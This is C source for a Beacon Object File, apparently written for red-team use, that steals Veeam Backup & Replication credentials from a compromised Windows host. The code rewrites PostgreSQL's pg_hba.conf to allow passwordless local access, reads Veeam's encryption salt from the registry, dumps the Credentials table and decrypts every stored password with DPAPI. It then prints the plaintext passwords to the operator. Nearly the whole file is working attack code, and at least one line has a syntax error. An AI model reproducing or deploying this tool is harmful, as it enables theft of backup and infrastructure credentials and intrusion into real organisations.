/* vboops-bof.c */

/*
 * Author: ripmeep
 * Date  : 10/11/2026
 *
 * A Beacon Object File (BOF) source to extract Veeam database credentials, and decrypt them
 * through inline execution.
 */

#include <windows.h>
#include "beacon.h"

/* BOF variables */
#define PG_ROOT_PATH                "C:\\Program Files\\PostgreSQL\\17" /* Path to PostgreSQL install */
#define PG_DLL_PATH                 "bin"                               /* PostgreSQL bin directory name (default=bin) */
#define PG_DLL_NAME                 "libpq.dll"                         /* PostgreSQL DLL name (default=libpq.dll) */
#define PG_CONF_PATH                "data\\pg_hba.conf"                 /* PostgreSQL access configuration path (pg_hba.conf) */
#define PG_USERNAME                 "postgres"                          /* Username to connect to the Veeam database as */
#define PG_HOST                     "localhost"                         /* Host of the PostgreSQL database (rarely needs changing) */
#define PG_DATABASE                 "VeeamBackup"                       /* Database name of the Veeam Credential store */

#define VEEAM_SALT_ROOT             HKEY_LOCAL_MACHINE
#define VEEAM_SALT_SUBKEY           "SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data" /* Registry key path of the EncryptionSalt key */
#define VEEAM_SALT_KEY              "EncryptionSalt" /* Registry key name of the encryption salt used to encrypt credentials in the db */
#define VEEAM_ENCRYPTION_HEADER_LEN 37 /* 37 is the length of the header in Veeam's encrypted strings which we later discard */

//#define MAX_PATH                    1024 /* Feel free to change this based on system MAX_PATH requirements */
#define _V                          "VEEAM-BACKOOPS-BOF | "
#define _D                          "VEEAM-BACKOOPS-BOF | DEBUG: " /* Just for debugging stuff */

/* KERNEL32 function templates */
DECLSPEC_IMPORT WINAPI HGLOBAL KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT WINAPI HGLOBAL KERNEL32$GlobalFree(HGLOBAL);
DECLSPEC_IMPORT WINAPI HLOCAL  KERNEL32$LocalFree(HLOCAL); 
DECLSPEC_IMPORT WINAPI DWORD   KERNEL32$GetLastError();
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$SetDllDirectoryA(LPCSTR);
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$CopyFileA(LPCSTR, LPCSTR, BOOL);
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$MoveFileExA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT WINAPI HANDLE  KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINAPI DWORD   KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINAPI DWORD   KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
DECLSPEC_IMPORT WINAPI BOOL    KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINAPI LSTATUS KERNEL32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINAPI LSTATUS KERNEL32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT WINAPI LSTATUS KERNEL32$RegCloseKey(HKEY);
/* CRYPT32 function templates */
DECLSPEC_IMPORT WINAPI BOOL    CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
DECLSPEC_IMPORT WINAPI BOOL    CRYPT32$CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*); 

/* Bit more readable since these will be used a fair bit */
#define ALLOC(S) KERNEL32$GlobalAlloc(GPTR, S)
#define FREE(M)  KERNEL32$GlobalFree(M)

/* PostgreSQL return types as per the libpq.dll, but we define them here */
typedef enum {
  PQ_CONNECTION_OK,
  PQ_CONNECTION_BAD
} PG_CONNECTION_STATUS;

typedef enum {
  PG_RES_EMPTY_QUERY,
  PG_RES_OK,
  PG_RES_TUPLE_OK,
  PG_RES_BAD
} PG_EXEC_STATUS;

/* libpq template functions */
typedef int (__cdecl *PQlibVersion_t)(void);

/* These are defined as such for the next functions */
typedef struct PGconn PGconn;
typedef struct PGresult PGresult;

typedef PGconn* (__cdecl *PQconnectdb_t)(const char*);
typedef PG_CONNECTION_STATUS (__cdecl *PQstatus_t)(PGconn*);
typedef void (__cdecl *PQfinish_t)(PGconn*);
typedef PGresult* (__cdecl *PQexec_t)(PGconn*, const char*);
typedef PG_EXEC_STATUS (__cdecl *PQresultStatus_t)(PGresult*);
//typedef void (__cdecl *PQclear_t)(PGresult*);
typedef int (__cdecl *PQntuples_t)(PGresult*);
typedef char* (__cdecl *PQgetvalue_t)(PGresult*, int, int);

/* Pack these function pointers into a struct - who said C doesn't have classes? */
typedef struct {
  /* Main module handle to DLL */
  HMODULE           __mod;
  /* Function mappings */
  PQlibVersion_t    PQlibVersion;
  PQconnectdb_t     PQconnectdb;
  PQstatus_t        PQstatus;
  PQfinish_t        PQfinish;
  PQexec_t          PQexec;
  PQresultStatus_t  PQresultStatus;
  PQntuples_t       PQntuples;
  PQgetvalue_t      PQgetvalue;
  //PQclear_t         PQclear;
  /* PostgreSQL attributes */
  PGconn           *conn;
  PGresult         *res;
} libpq_t;

/* Database row from Credentials as a struct - to be used as a linked list */
struct vb_credential {
  char *username;
  char *password;
  char *description;
  char *plaintext;

  struct vb_credential *next;
};

/* Struct for PostgreSQL configuration data and Veeam DB data */
typedef struct {
  char                 *pg_hba_path;        /* Path to pg_hba.conf */
  char                 *pg_hba_path_copy;   /* Buffer for temporary config copy path */
  char                 *pg_hba_config;      /* New configuration */
  char                 *pg_hba_orig;        /* Original configuration (mem backup) */

  size_t                pg_hba_len;         /* Length of configuration (used for orignal) */
  
  struct vb_credential *vbc;                /* Database credential row values */

  unsigned char        *encryption_salt;    /* Encryption salt for encrypted Veeam credentials */
  DWORD                encryption_salt_len; /* Length of the Veeam encryption salt */
} vb_data_t;

/* Useful BOF functions to replace the ones from CRT */
SIZE_T bof_strlen(const char *str) {
  SIZE_T len = 0;
	if (!str)
		return len;

	while (*str++ != '\0')
		len++;

	return len;
}

void bof_memcpy(void *dst, void *src, SIZE_T len) {
	unsigned char *pdst = dst;
	unsigned char *psrc = src;
	for (SIZE_T i = 0; i < len; i++)
		*(pdst++) = *(psrc++);
}

void bof_memset(void *dst, unsigned char v, SIZE_T len) {
	unsigned char *pdst = dst;
	for (SIZE_T i = 0; i < len; i++)
		*(pdst++) = v;
}

char* bof_strdup(const char *str) {
	if (!str)
		return NULL;

	SIZE_T len = bof_strlen(str) + 1;
	char *dup = ALLOC(len);
	
  if (!dup)
    return NULL;

  bof_memset(dup, 0, len);
	bof_memcpy((void*)dup, (void*)str, len);

	return dup;
}

/* vboops-bof functions */
static int vb_path(char **md, const char *root, const char *path, SIZE_T len) {
  if (!root || !path || len == 0)
    return 0;

  /* Take a copy of the root so this call can be nested without modifying it mid-call */
  char *root_copy = bof_strdup(root);
  char root_suffix = root_copy[bof_strlen(root_copy) - 1];
  formatp fmt_path;
  int size = 0;
 
  BeaconFormatAlloc(&fmt_path, len);
  
  if (fmt_path.buffer == NULL) {
    FREE(root_copy);
    return 0;
  }

  BeaconFormatPrintf(&fmt_path, "%s%s%s",
                     root,
                     (root_suffix == '/' || root_suffix == '\\') ? "" : "\\", /* Does the root already have a / or \ ? If not, add one */
                     path);

  *md = bof_strdup(BeaconFormatToString(&fmt_path, &size)); /* bof_strdup as the following BeaconFormatFree will also free the char ptr */
  BeaconFormatFree(&fmt_path);
  FREE(root_copy); /* Free the copy, done with it now */

  return size;
}

static DWORD vb_libpq_map(libpq_t *pq, char **out_path) {
  int size = 0;
  size = vb_path(out_path, PG_ROOT_PATH, PG_DLL_PATH, MAX_PATH);

  if (size <= 0)
    return ERROR_BAD_LENGTH;
  
  /* Ok broski can't just load the libpq.dll without setting this DLL directory
   * as it has a load of dependencies which can just be loaded from here ezpz :) */
  if (!KERNEL32$SetDllDirectoryA(*out_path))
    return KERNEL32$GetLastError();

  char *old = *out_path;
  size = vb_path(out_path, old, PG_DLL_NAME, MAX_PATH);

  if (size <= 0)
    return ERROR_BAD_LENGTH;

  FREE(old);

  char *libpq_path = *out_path;

  pq->conn = NULL;
  pq->res = NULL;

  pq->__mod = LoadLibraryA((LPCSTR)libpq_path); /* Apparently LoadLibraryA() doesn't need a DECLSPEC_IMPORT
                                                   as it's part of a small set of pre-defined functions in the
                                                   BOF/COFF, the same as GetProcAddress() which is why that works in
                                                   vb_libpq_map() on it's own. */

  if (!pq->__mod)
    return KERNEL32$GetLastError();

  /* Map all the PostgreSQL libpq.dll functions that we need into that poor excuse for a C-class, and I ain't talking Mercedes */
  pq->PQlibVersion = (PQlibVersion_t)GetProcAddress(pq->__mod, "PQlibVersion");
  pq->PQconnectdb = (PQconnectdb_t)GetProcAddress(pq->__mod, "PQconnectdb");
  pq->PQstatus = (PQstatus_t)GetProcAddress(pq->__mod, "PQstatus");
  pq->PQfinish = (PQfinish_t)GetProcAddress(pq->__mod, "PQfinish");
  pq->PQexec = (PQexec_t)GetProcAddress(pq->__mod, "PQexec");
  pq->PQresultStatus = (PQresultStatus_t)GetProcAddress(pq->__mod, "PQresultStatus");
  pq->PQntuples = (PQntuples_t)GetProcAddress(pq->__mod, "PQntuples");
  pq->PQgetvalue = (PQgetvalue_t)GetProcAddress(pq->__mod, "PQgetvalue");
 
  /* They better have mapped */
  if (!pq->PQlibVersion || !pq->PQconnectdb || !pq->PQstatus ||
      !pq->PQfinish || !pq->PQexec || !pq->PQresultStatus ||
      !pq->PQntuples || !pq->PQgetvalue)
    return KERNEL32$GetLastError();

  return ERROR_SUCCESS;
}

/* This function is primarily used by the vb_credential_decrypt() function, but nice to include it */
static DWORD vb_base64_decode(const char *enc, unsigned char **dec) {
  if (!enc || ! dec)
    return 0;

  /* Get the required amount of alloc'd bytes first, then decode after that's been alloc'd */
  DWORD req = 0;
  if (!CRYPT32$CryptStringToBinaryA(enc, 0, CRYPT_STRING_BASE64,
                                    NULL, &req, NULL, NULL))
    return 0;

  *dec = ALLOC(req + 1);
  if (!*dec)
    return 0;

  /* Zero it out first (learnt the hard way), then decode */
  bof_memset(*dec, 0, req + 1);
  if (!CRYPT32$CryptStringToBinaryA(enc, 0, CRYPT_STRING_BASE64,
                                    *dec, &req, NULL, NULL)) {
    FREE(*dec);
		*dec = NULL
    return 0;
  }

  return req;
}

static DWORD vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
  if (!vb_data)
    return 0;

  vb_path(&vb_data->pg_hba_path, PG_ROOT_PATH, PG_CONF_PATH, MAX_PATH); /* Parent struct is FREE'd in go(...)
                                                                           on error or success */ 
  HANDLE h_conf = KERNEL32$CreateFileA(vb_data->pg_hba_path, GENERIC_READ,
                                       0, NULL,
                                       OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY,
                                       NULL);

  if (h_conf == (HANDLE)-1 /* INVALID_HANDLE_VALUE */)
    return KERNEL32$GetLastError();

  /* Store the original pg_hba.conf contents in memory as a sort of backup (ironic lol).
   * Just in case we can overwrite it but NOT restore it - idk how that would happen, maybe a dangly handle (hahahaha)
   * or smth similar that just gets left behind and locks the config - anyway, if that happens, we can output this and
   * tell Mr Red Teamer that it failed to restore and give them the original config to restore menually. */
  vb_data->pg_hba_len = KERNEL32$GetFileSize(h_conf, NULL);
  if (vb_data->pg_hba_len <= 0) {
    KERNEL32$CloseHandle(h_conf);
    return ERROR_BAD_LENGTH;
  }

  vb_data->pg_hba_orig = ALLOC(vb_data->pg_hba_len);
  if (!vb_data->pg_hba_orig) {
    DWORD ret = KERNEL32$GetLastError();
    KERNEL32$CloseHandle(h_conf);
    return ret;
  }

  if (!KERNEL32$ReadFile(h_conf, vb_data->pg_hba_orig, vb_data->pg_hba_len,
                         0, NULL)) {
    DWORD ret = KERNEL32$GetLastError();
    KERNEL32$CloseHandle(h_conf);
    return ret;
  }

  SIZE_T new_conf_len = 128 + (bof_strlen(PG_DATABASE) * 2) + \
                              (bof_strlen(PG_USERNAME) * 2);

  vb_data->pg_hba_config = ALLOC(new_conf_len);
  if (!vb_data->pg_hba_config) {
    DWORD ret = KERNEL32$GetLastError();
    KERNEL32$CloseHandle(h_conf);
    return ret;
  }

  formatp fmt_new_conf, fmt_path_copy;
  BeaconFormatAlloc(&fmt_new_conf, new_conf_len);

  if (fmt_new_conf.buffer == NULL) {
    KERNEL32$CloseHandle(h_conf);
    return ERROR_NOT_ENOUGH_MEMORY;
  }

  BeaconFormatAlloc(&fmt_path_copy, bof_strlen(vb_data->pg_hba_path) + 16);

  if (fmt_path_copy.buffer == NULL) {
    KERNEL32$CloseHandle(h_conf);
    BeaconFormatFree(&fmt_new_conf);
    return ERROR_NOT_ENOUGH_MEMORY;
  }

  /* The pg_hba.conf will be overwritten with the below, which basically allows/trusts all connecions
   * from localhost to be successfully auth'd without a password */
  BeaconFormatPrintf(&fmt_new_conf,
                     "host\t%s\t%s\t::1/128\ttrust\n" \
                     "host\t%s\t%s\t127.0.0.1/32\ttrust\n" \
                     "host\tall\tall\t127.0.0.1/32\tmd5",
                     PG_DATABASE, PG_USERNAME, PG_DATABASE, PG_USERNAME);

  BeaconFormatPrintf(&fmt_path_copy, "%s.backoop", vb_data->pg_hba_path);

  DWORD bw = 0, ret = 0;
  int fmt_conf_len = 0, fmt_copy_len = 0;
  vb_data->pg_hba_config = bof_strdup(BeaconFormatToString(&fmt_new_conf, &fmt_conf_len));
  vb_data->pg_hba_path_copy = bof_strdup(BeaconFormatToString(&fmt_path_copy, &fmt_copy_len));

  KERNEL32$CloseHandle(h_conf);

  if (!KERNEL32$CopyFileA(vb_data->pg_hba_path, vb_data->pg_hba_path_copy, FALSE))
    ret = KERNEL32$GetLastError() + 1; /* + 1 in case GetLastError() returns a ERROR_SUCCESS (0) but one of the 
                                          functions in the condition did not return as expected, therefore, ret
                                          will assist in not attempting an overwrite in just a sec */

  h_conf = KERNEL32$CreateFileA(vb_data->pg_hba_path, GENERIC_WRITE,
                                0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
                                NULL);

  if (h_conf == (HANDLE)-1 /* INVALID_HANDLE_VALUE */)
    ret = KERNEL32$GetLastError() + 1; /* Please see above for "+1" */

  /* funky */
  ret = (ret) ? ret - 1 : (
      (KERNEL32$WriteFile(h_conf, vb_data->pg_hba_config, fmt_conf_len, &bw, NULL)) ? ERROR_SUCCESS : KERNEL32$GetLastError()
  );
      
  KERNEL32$CloseHandle(h_conf);
  BeaconFormatFree(&fmt_new_conf);
  BeaconFormatFree(&fmt_path_copy);

  return ret;
}

static DWORD vb_data_pg_hba_restore(vb_data_t *vb_data) {
  if (!vb_data)
    return ERROR_INVALID_DATA;
  /* MoveFileExA(...) may still call SetLastError if the file exists, so yeah. */
  return KERNEL32$MoveFileExA(vb_data->pg_hba_path_copy, vb_data->pg_hba_path, MOVEFILE_REPLACE_EXISTING) ? ERROR_SUCCESS : KERNEL32$GetLastError();
}

static LSTATUS vb_get_encryption_salt(unsigned char **md, DWORD *olen,
                                     HKEY root, const char *subkey, const char *key) {
  if (!subkey || !key) {
    *olen = 0;
    return ERROR_INVALID_DATA;
  }

  LSTATUS r = ERROR_SUCCESS;
  HKEY h_key = 0;
  if ((r = KERNEL32$RegOpenKeyExA(root, subkey,
                                  0, KEY_READ | KEY_WOW64_64KEY,
                                  &h_key)) != ERROR_SUCCESS) {
    *olen = 0;
    return r;
  }

  DWORD t = 0, s = 0;
  if ((r = KERNEL32$RegQueryValueExA(h_key, key,
                                     NULL, &t, NULL, &s)) != ERROR_SUCCESS) {
    *olen = 0;
    return r;
  }

  *md = (unsigned char*)ALLOC(s + 1);
  if (!(*md)) {
    r = KERNEL32$GetLastError();
    KERNEL32$RegCloseKey(h_key);
    *olen = 0;
    return r;
  }

  bof_memset(*md, 0, s + 1);
  if ((r = KERNEL32$RegQueryValueExA(h_key, key,
                                     NULL, NULL, (LPBYTE)*md, &s)) != ERROR_SUCCESS) {
    r = KERNEL32$GetLastError();
    *olen = 0;
  } else {
    *olen = s;
  }

  KERNEL32$RegCloseKey(h_key);

  return r;
}

static int vb_libpq_connect(libpq_t *pq) {
  if (!pq || !pq->PQconnectdb || !pq->PQstatus)
    return 0;

  SIZE_T cs_len = 64 + bof_strlen(PG_HOST) + \
                       bof_strlen(PG_DATABASE) + \
                       bof_strlen(PG_USERNAME);

  formatp fmt_cs;
  int fmt_cs_len = 0;
  char *cs; /* PostgreSQL connection string */
  BeaconFormatAlloc(&fmt_cs, cs_len);
  BeaconFormatPrintf(&fmt_cs, "host=%s dbname=%s user=%s", PG_HOST, PG_DATABASE, PG_USERNAME);
  cs = BeaconFormatToString(&fmt_cs, &fmt_cs_len);

  pq->conn = pq->PQconnectdb(cs);

  return pq->PQstatus(pq->conn) == (int)PQ_CONNECTION_OK;
}

struct vb_credential *vb_credential_add(struct vb_credential *vbc,
                                        char *username, char *password, char *description) {
  struct vb_credential *new = (struct vb_credential*)ALLOC(sizeof(struct vb_credential));
  if (!new)
    return NULL;

  new->username = bof_strdup(username);
  if (!new->username) {
    FREE(new);
    return NULL;
  }

  new->password = bof_strdup(password);
  if (!new->password) {
    FREE(new->username);
    FREE(new);
    return NULL;
  }

  new->description = bof_strdup(description);  /* No matter if this is NULL as it might be empty?
                                                * Ensure it's checked after return. */
  new->plaintext = NULL;
  new->next = NULL;

  if (!vbc)
    return new;

  struct vb_credential *tmp = vbc;
  while (1) {
    if (!tmp->next) {
      tmp->next = new;
      break;
    }

    tmp = tmp->next;
  }

  return new;
}

/* Decrypt the password content inside a struct vb_credential* */
static DWORD vb_credential_decrypt(struct vb_credential *vbc, unsigned char *enc_salt) {
  if (!vbc || !enc_salt)
    return 0;

  unsigned char *dec_salt, *dec_password;
  DWORD dec_salt_len, dec_password_len, ret = 0;
  if (!(dec_salt_len     = vb_base64_decode((const char*)enc_salt, &dec_salt)) ||
      !(dec_password_len = vb_base64_decode((const char*)vbc->password, &dec_password)))
    return 0;

  if (dec_password_len <= VEEAM_ENCRYPTION_HEADER_LEN)
    goto crypto_param_cleanup;

  /* Skip over the encryption header */
  unsigned char *ctx = dec_password + VEEAM_ENCRYPTION_HEADER_LEN;
  dec_password_len -= VEEAM_ENCRYPTION_HEADER_LEN;

  DATA_BLOB in_blob      = { .pbData = ctx,      .cbData = dec_password_len },
            entropy_blob = { .pbData = dec_salt, .cbData = dec_salt_len     }, 
            out_blob     = { 0 };

  /* Decrypt via system context */
  if (!CRYPT32$CryptUnprotectData(&in_blob, NULL, &entropy_blob,
                                  NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE,
                                  &out_blob))
    goto crypto_cleanup;

  vbc->plaintext = (char*)ALLOC(out_blob.cbData + 1);
  if (!vbc->plaintext) {
    KERNEL32$LocalFree(out_blob.pbData);
    goto crypto_cleanup;
  }

  bof_memset(vbc->plaintext, 0, out_blob.cbData + 1);
  bof_memcpy(vbc->plaintext, out_blob.pbData, out_blob.cbData);
  ret = 1;

crypto_cleanup:
  bof_memset(&in_blob, 0, sizeof(in_blob));
  bof_memset(&entropy_blob, 0, sizeof(entropy_blob));
  bof_memset(&out_blob, 0, sizeof(out_blob));
crypto_param_cleanup:
  bof_memset(dec_salt, 0, dec_salt_len);
  bof_memset(dec_password, 0, dec_password_len);
crypto_free:
  /* These bad boiz were alloc'd via GlobalAlloc in vb_base64_decode() */
  FREE(dec_salt);
  FREE(dec_password);

  return ret;
}

static int vb_get_credentials(libpq_t *pq, struct vb_credential **vbc) {
  if (!pq || !pq->PQexec || !pq->PQresultStatus || !pq->PQntuples) 
    return 0;

  /* Cmon Veeam, *username* is all 1 word and I won't hear otherwise */
  pq->res = pq->PQexec(pq->conn, "SELECT user_name,password,description FROM Credentials");
  if ((int)pq->PQresultStatus(pq->res) != PG_RES_TUPLE_OK) /* Check we good */
    return 0;

  int rows = pq->PQntuples(pq->res), ret = 0;
  if (!rows)
    return ret;

  for (int r = 0; r < rows; r++) {
    char *username    = pq->PQgetvalue(pq->res, r, 0), 
         *password    = pq->PQgetvalue(pq->res, r, 1),
         *description = pq->PQgetvalue(pq->res, r, 2); 
    
    /* Only care about the credential sets that contain a password */
    if (strlen(password) > 0) {
      /* If we don't have a head for a linked list of struct vb_credential* yet, make one */
      if (!ret) *vbc = vb_credential_add(NULL, username, password, description); 
      else vb_credential_add(*vbc, username, password, description);
      
      ret++;
    }
  }

  return ret;
}

void vb_data_free(vb_data_t *vb_data) {
  if (!vb_data)
    return;

  /* Yes check for these individually as KERNEL32$GlobalFree won't ignore
   * NULLs mateyboi */

  if (vb_data->pg_hba_config)   FREE(vb_data->pg_hba_config);
  if (vb_data->pg_hba_orig)     FREE(vb_data->pg_hba_orig);
  if (vb_data->encryption_salt) FREE(vb_data->encryption_salt);

  if (vb_data->vbc) {
    struct vb_credential *cur = vb_data->vbc, *tmp;
    while (cur) {
      tmp = cur;
      cur = cur->next;
      if (tmp->username)    FREE(tmp->username);
      if (tmp->password)    FREE(tmp->password);
      if (tmp->description) FREE(tmp->description);
      if (tmp->plaintext)   FREE(tmp->plaintext);
      if (tmp)              FREE(tmp);
    }
  }
}

void vb_libpq_free(libpq_t *pq) {
  if (!pq || !pq->PQfinish)
    return;

  if (pq->conn)
    pq->PQfinish(pq->conn);

  if (pq->__mod)
    KERNEL32$FreeLibrary(pq->__mod);
}

void go(char *args, int a_len) {
  char *libpq_path;
  libpq_t pq;
  DWORD status;

  /* Banner */
  BeaconPrintf(CALLBACK_OUTPUT, "                     --+== veeam-backoops by ripmeep ==+--\n");

  /* Map libpq.dll functions to our struct */
  if ((status = vb_libpq_map(&pq, &libpq_path)) != ERROR_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, _V"vb_libpq_map(...) failed to map libpq functions on %s [0x%08x]\n" \
                                 _V"Check if \"%s\" exists and \"%s\" is in the target directory",
                                 libpq_path, status, PG_ROOT_PATH, PG_DLL_PATH);
    return;
  }

  BeaconPrintf(CALLBACK_OUTPUT, _V"Mapped libpq successfully [libpq v%d]\n", pq.PQlibVersion());

  /* Overwrite the pg_hba.conf to let us in the db, but make a copy of the original conf, and store the contents in memory for 2 lil backups */
  vb_data_t vb_data = { 0 };
  if ((status = vb_data_pg_hba_overwrite(&vb_data)) != ERROR_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, _V"vb_data_pg_hba_overwrite(...) failed to create copy of or overwrite PostgreSQL access configuration [0x%08x]\n", status);
    goto cleanup;
  }

  BeaconPrintf(CALLBACK_OUTPUT, _V"Successfully overwritten PostgreSQL access configuration\n");

  /* Connect to the DB now that the PostgreSQL conf has been overwritten to let us in */
  if (!(status = vb_libpq_connect(&pq))) {
    BeaconPrintf(CALLBACK_ERROR, _V"vb_libpq_connect(...) failed to connect to database \"%s\" @ %s as user \"%s\" [0x%02x]",
                                 PG_DATABASE, PG_HOST, PG_USERNAME, status); 
    goto cleanup;
  }

  BeaconPrintf(CALLBACK_OUTPUT, _V"Connected to database [host=%s] [db=%s] [user=%s]\n",
                                PG_HOST, PG_DATABASE, PG_USERNAME);

  /* This is what I was talkin about earlier - if we could overwrite the pg_hba.conf, but cannot restore the original (MoveFileExA())
   * let them know, but also give them the mem-stored version of the config so they can restore the original manually if needed. */
  if ((status = vb_data_pg_hba_restore(&vb_data)) != ERROR_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, _V"vb_data_pg_hba_restore(...) failed to restore the original PostgreSQL access configuration [0x%08lx]\n" \
                                 _V"Manual intervention is required - either:\n" \
                                 _V"Check if \"%s\" exists, and replace the original config with it\n" \
                                 _V"  OR\n" \
                                 _V"Below is what we have of the original configuration\n" \
                                 _V"If possible, please replace the contents of \"%s\" with the below:\n\n" \
                                 "%s",
                 status, vb_data.pg_hba_path_copy, vb_data.pg_hba_path, vb_data.pg_hba_orig);          
  }

  BeaconPrintf(CALLBACK_OUTPUT, _V"Restored original PostgreSQL access configuration\n");

  /* Get the Veeam encryption salt from the registry -> VEEAM_SALT_ROOT\VEEAM_SALT_SUBKEY\VEEAM_SALT_KEY */
  if ((status = (DWORD)vb_get_encryption_salt(&vb_data.encryption_salt, &vb_data.encryption_salt_len,
                                              VEEAM_SALT_ROOT, VEEAM_SALT_SUBKEY, VEEAM_SALT_KEY)) != ERROR_SUCCESS) {
    BeaconPrintf(CALLBACK_ERROR, _V"vb_get_encryption_salt(...) failed to retrieve the encryption salt from registry \"%s\\%s\" [0x%08x]",
                                 VEEAM_SALT_SUBKEY, VEEAM_SALT_KEY, status);
    goto cleanup;
  }

  BeaconPrintf(CALLBACK_OUTPUT, _V"Retrieved the Veeam encryption salt [%s]", vb_data.encryption_salt);


  /* Get the credentials from the Veeam credential DB */
  if (!(status = vb_get_credentials(&pq, &vb_data.vbc))) {
    BeaconPrintf(CALLBACK_ERROR, _V"vb_get_credentials(...) failed to query database or extract any credentials [%s]\n", PG_DATABASE);
    goto cleanup;
  }

  BeaconPrintf(CALLBACK_OUTPUT, _V"%d set(s) of credentials retrieved from the database [%s]", status, PG_DATABASE);
 
  /* Iterate over the linked list of creds and attempt decrypting each one */
  int d = 0;
  for (struct vb_credential *cred = vb_data.vbc; cred; cred = cred->next) {
    if (!vb_credential_decrypt(cred, vb_data.encryption_salt)) {
        BeaconPrintf(CALLBACK_ERROR, _V"Failed to decrypt password for \"%s\"", cred->username);
        continue;
    }
    d++;
  }

  /* Output the results! */
  BeaconPrintf(CALLBACK_OUTPUT, _V"Decrypted %d/%d credentials", d, status);

  if (d <= 0)
    goto cleanup;

  BeaconPrintf(CALLBACK_OUTPUT, _V);
  BeaconPrintf(CALLBACK_OUTPUT, _V"%-48s | %-32s | %s\n\t", "DESCRIPTION", "USERNAME", "PLAINTEXT PASSWORD");
  BeaconPrintf(CALLBACK_OUTPUT, _V"-------------------------------------------------+----------------------------------+---------------------------------\n");
  for (struct vb_credential *cred = vb_data.vbc; cred; cred = cred->next) {
    if (!cred->plaintext) /* Only want to show credentials which we have decrypted successfully */
      continue;
    BeaconPrintf(CALLBACK_OUTPUT, _V"%-48s | %-32s | %s\n", cred->description ? cred->description : "", cred->username, cred->plaintext);
  }
  BeaconPrintf(CALLBACK_OUTPUT, _V);

cleanup:
  vb_libpq_free(&pq);
  vb_data_free(&vb_data);
  if (libpq_path) FREE(libpq_path);
}

